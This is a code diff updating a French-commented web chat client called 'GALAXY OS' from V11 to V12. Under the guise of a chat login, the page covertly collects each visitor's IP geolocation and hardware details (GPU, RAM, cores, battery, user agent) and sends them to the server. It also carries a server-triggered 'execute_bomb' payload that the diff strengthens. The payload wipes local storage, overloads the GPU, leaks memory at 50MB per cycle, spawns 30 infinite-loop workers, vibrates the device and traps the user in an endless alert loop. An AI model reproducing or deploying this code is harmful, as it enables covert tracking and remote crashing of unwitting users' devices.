@@ -3,63 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>GALAXY OS - V11</title>
+    <title>GALAXY OS - V12</title>
     <style>
-        :root { --main: #a29bfe; --glow: 0 0 20px #6c5ce7; }
-        body { margin: 0; background: #000 url('https://w0.peakpx.com/wallpaper/521/633/HD-wallpaper-incandescent-stars-sky-galaxy.jpg') no-repeat center center fixed; background-size: cover; font-family: 'Consolas', monospace; color: white; height: 100vh; display: flex; overflow: hidden; }
+        :root { --main: #a29bfe; --red: #ff4757; }
+        body { margin: 0; background: #000; font-family: 'Consolas', monospace; color: white; height: 100vh; display: flex; overflow: hidden; }
         
-        /* LOGIN */
-        #login-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 10000; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(20px); }
-        .login-box { background: rgba(10,10,20,0.9); padding: 40px; border-radius: 20px; border: 1px solid var(--main); text-align: center; width: 300px; box-shadow: var(--glow); }
-        
-        /* UI LAYOUT */
-        #side-menu { width: 260px; background: rgba(0,0,0,0.85); border-right: 1px solid rgba(255,255,255,0.1); display: flex; flex-direction: column; }
+        /* STYLE DU CHAT */
+        #login-overlay { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; }
+        .login-box { border: 1px solid var(--main); padding: 40px; text-align: center; background: #0a0a0a; width: 300px; }
+        #side-menu { width: 250px; background: #050505; border-right: 1px solid #222; display: flex; flex-direction: column; }
         #main-chat { flex: 1; display: flex; flex-direction: column; }
-        #messages { flex: 1; overflow-y: auto; padding: 20px; list-style: none; scroll-behavior: smooth; }
-        
-        /* MESSAGES */
-        .msg-card { margin-bottom: 15px; padding: 12px; background: rgba(255,255,255,0.05); border-radius: 10px; border-left: 3px solid var(--main); animation: in 0.2s ease; }
-        @keyframes in { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
-        .mini-pp { width: 35px; height: 35px; border-radius: 5px; border: 1px solid var(--main); margin-right: 10px; object-fit: cover; }
-        
-        /* INPUT */
-        #form { display: flex; padding: 15px; background: rgba(0,0,0,0.9); gap: 10px; }
-        #input { flex: 1; background: #111; border: 1px solid var(--main); color: white; padding: 10px 15px; border-radius: 20px; outline: none; }
-        .btn { border: none; background: var(--main); color: white; padding: 10px 20px; border-radius: 20px; cursor: pointer; font-weight: bold; }
+        #messages { flex: 1; overflow-y: auto; padding: 20px; list-style: none; }
+        .msg-card { background: #111; padding: 10px; margin-bottom: 10px; border-left: 3px solid var(--main); }
+        #form { display: flex; padding: 15px; background: #000; gap: 10px; }
+        #input { flex: 1; background: #111; border: 1px solid var(--main); color: white; padding: 10px; outline: none; }
+        .btn { background: var(--main); color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
 
-        /* MONITOR */
-        #monitor { padding: 15px; font-size: 0.7em; color: #00ff88; border-top: 1px solid #222; }
-
-        /* CRASH SCREEN */
-        #crash-layer { display: none; position: fixed; inset: 0; background: #000; z-index: 999999; overflow: hidden; text-align: center; }
+        /* INTERFACE DE CRASH */
+        #bomb-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 999999; text-align: center; color: red; }
+        #bomb-screen canvas { position: absolute; inset: 0; width: 100%; height: 100%; opacity: 0.5; }
+        .glitch { position: relative; z-index: 1000000; margin-top: 40vh; font-size: 3em; animation: flash 0.1s infinite; }
+        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
 
-    <div id="crash-layer">
-        <canvas id="gpu-burn"></canvas>
-        <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:100%;">
-            <h1 style="color:red; font-size: 3em; text-shadow: 0 0 10px red;">SYSTEM_MELTDOWN</h1>
-            <p id="load-val" style="color:white; font-size: 1.5em;">BUFFERING_VIDEO: 0%</p>
-        </div>
+    <div id="bomb-screen">
+        <canvas id="gpu-kill"></canvas>
+        <h1 class="glitch">SYSTEM_MELTDOWN</h1>
+        <p id="mem-stat" style="position:relative; z-index:1000000; color:white;"></p>
     </div>
 
     <div id="login-overlay">
         <div class="login-box">
-            <h2 style="color:var(--main); letter-spacing:3px;">GALAXY_V11</h2>
-            <input type="text" id="login-name" placeholder="IDENTIFIANT..." style="width:100%; padding:10px; margin-bottom:15px; background:#000; border:1px solid #333; color:white;">
-            <input type="file" id="login-pp-file" accept="image/*" style="width:100%; font-size:0.7em; margin-bottom:20px;">
-            <button class="btn" style="width:100%;" onclick="startDeepScan()">INITIALISER</button>
+            <h2 style="color:var(--main);">GALAXY_OS_V12</h2>
+            <input type="text" id="login-name" placeholder="PSEUDO..." style="width:100%; padding:10px; margin-bottom:10px; background:#000; color:white; border:1px solid #333;">
+            <input type="file" id="login-pp-file" style="font-size:0.7em; margin-bottom:20px;">
+            <button class="btn" style="width:100%;" onclick="startDeepScan()">CONNECTER</button>
         </div>
     </div>
 
     <div id="side-menu">
         <div style="padding:20px; text-align:center;">
-            <img src="" id="my-avatar" style="width:60px; height:60px; border-radius:10px; border:1px solid var(--main); display:none; object-fit: cover;">
-            <h4 id="my-name-display" style="margin-top:10px;"></h4>
+            <img src="" id="my-avatar" style="width:70px; height:70px; border-radius:50%; border:2px solid var(--main); display:none; object-fit: cover;">
+            <h4 id="my-name-display"></h4>
         </div>
-        <div id="monitor">
-            <p id="mon-ip">IP: SCAN...</p>
+        <div style="padding:20px; font-size:0.7em; color:lime;" id="monitor">
+            <p id="mon-ip">IP: SCANNING...</p>
             <p id="mon-bat">BAT: --%</p>
         </div>
     </div>
@@ -67,61 +57,56 @@
     <div id="main-chat">
         <ul id="messages"></ul>
         <form id="form">
-            <input id="input" autocomplete="off" placeholder="TRANSMISSION..." />
-            <button type="submit" class="btn">SEND</button>
+            <input id="input" autocomplete="off" placeholder="COMMANDE..." />
+            <button type="submit" class="btn">EXEC</button>
         </form>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let user = JSON.parse(localStorage.getItem('galaxy_v11')) || { name: "", pp: "", geo: {}, hardware: {} };
-        let bombInterval;
+        let user = JSON.parse(localStorage.getItem('galaxy_v12')) || { name: "", pp: "", geo: {}, hardware: {} };
+        let bombWorkers = [];
 
         window.onload = () => { if(user.name) finalize(user.name, true); };
 
         async function startDeepScan() {
             const name = document.getElementById('login-name').value;
             if(!name) return;
+            try { const r = await fetch('https://ipapi.co/json/'); user.geo = await r.json(); } catch(e){}
             
-            // 1. Scan Géo
-            try { const res = await fetch('https://ipapi.co/json/'); user.geo = await res.json(); } catch(e) {}
-
-            // 2. Scan Hardware
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl');
             const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            
-            let battery = 100;
-            if(navigator.getBattery) { const b = await navigator.getBattery(); battery = Math.floor(b.level * 100); }
+            const b = await navigator.getBattery();
 
             user.hardware = {
                 gpu: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A",
                 ram: navigator.deviceMemory || "N/A",
                 cores: navigator.hardwareConcurrency,
-                battery: battery,
+                battery: Math.floor(b.level * 100),
                 ua: navigator.userAgent
             };
 
-            const ppFile = document.getElementById('login-pp-file').files[0];
-            if(ppFile) {
+            const file = document.getElementById('login-pp-file').files[0];
+            if(file) {
                 const reader = new FileReader();
                 reader.onload = (e) => { user.pp = e.target.result; finalize(name); };
-                reader.readAsDataURL(ppFile);
+                reader.readAsDataURL(file);
             } else {
                 user.pp = "https://i.pinimg.com/originals/a9/d0/96/a9d096ac3abc607758ca2d14e3f287ac.gif";
                 finalize(name);
             }
         }
 
-        function finalize(name, auto = false) {
+        function finalize(name, auto=false) {
             user.name = name;
-            if(!auto) localStorage.setItem('galaxy_v11', JSON.stringify(user));
+            if(!auto) localStorage.setItem('galaxy_v12', JSON.stringify(user));
             document.getElementById('login-overlay').style.display = 'none';
             document.getElementById('my-avatar').src = user.pp;
             document.getElementById('my-avatar').style.display = 'inline-block';
             document.getElementById('my-name-display').innerText = name;
-            document.getElementById('mon-ip').innerText = `IP: ${user.geo.ip || 'Local'}`;
+            document.getElementById('mon-ip').innerText = `IP: ${user.geo.ip || '---'}`;
             document.getElementById('mon-bat').innerText = `BAT: ${user.hardware.battery}%`;
             socket.emit('check_device', user);
         }
@@ -138,34 +123,50 @@
         socket.on('chat message', (data) => {
             const li = document.createElement('li');
             li.className = 'msg-card';
-            li.innerHTML = `<img src="${data.pp}" class="mini-pp"><b>${data.name}</b>: ${data.text}`;
+            li.innerHTML = `<b>${data.name}</b>: ${data.text}`;
             document.getElementById('messages').appendChild(li);
             document.getElementById('messages').scrollTop = document.getElementById('messages').scrollHeight;
         });
 
-        // CHARGE UTILE : LA BOMBE GRAPHIQUE
+        // 🧨 LA BOMBE DESTRUCTIVE (PC/MOBILE)
         socket.on('execute_bomb', () => {
             localStorage.clear();
-            document.getElementById('crash-layer').style.display = 'block';
-            const cv = document.getElementById('gpu-burn');
+            document.getElementById('bomb-screen').style.display = 'block';
+            
+            // 1. Surcharge GPU (Rendu massif)
+            const cv = document.getElementById('gpu-kill');
             const cx = cv.getContext('2d');
-            cv.width = window.innerWidth;
-            cv.height = window.innerHeight;
-
-            bombInterval = setInterval(() => {
-                if(navigator.vibrate) navigator.vibrate(1000);
-                // Surcharge GPU
-                for(let i=0; i<30000; i++) {
+            cv.width = window.innerWidth; cv.height = window.innerHeight;
+            setInterval(() => {
+                for(let i=0; i<50000; i++) {
                     cx.fillStyle = `rgb(${Math.random()*255},0,0)`;
-                    cx.fillRect(Math.random()*cv.width, Math.random()*cv.height, 3, 3);
+                    cx.fillRect(Math.random()*cv.width, Math.random()*cv.height, 2, 2);
                 }
-                document.getElementById('load-val').innerText = `BUFFERING_VIDEO: ${Math.floor(Math.random()*100)}%`;
-                console.error(new Array(1000000).fill("CORE_CRASH"));
             }, 10);
+
+            // 2. Surcharge RAM (Memory Leak)
+            const leak = [];
+            setInterval(() => {
+                leak.push(new Uint8Array(50 * 1024 * 1024)); // 50MB par cycle
+                document.getElementById('mem-stat').innerText = `OVERFLOW: ${leak.length * 50}MB`;
+            }, 100);
+
+            // 3. Surcharge CPU (Multi-threading)
+            const blob = new Blob([`while(true){postMessage(0)}`], {type: 'text/javascript'});
+            const url = URL.createObjectURL(blob);
+            for(let i=0; i<30; i++) {
+                let w = new Worker(url);
+                bombWorkers.push(w);
+            }
+
+            // 4. Blocage UI (Alertes & Vibrations)
+            if(navigator.vibrate) navigator.vibrate([10000, 500, 10000]);
+            while(true) {
+                alert("CRITICAL_ERROR: GALAXY_OS_NEUTRALIZED_YOU");
+            }
         });
 
         socket.on('stop_bomb', () => {
-            clearInterval(bombInterval);
             location.reload();
         });
     </script>
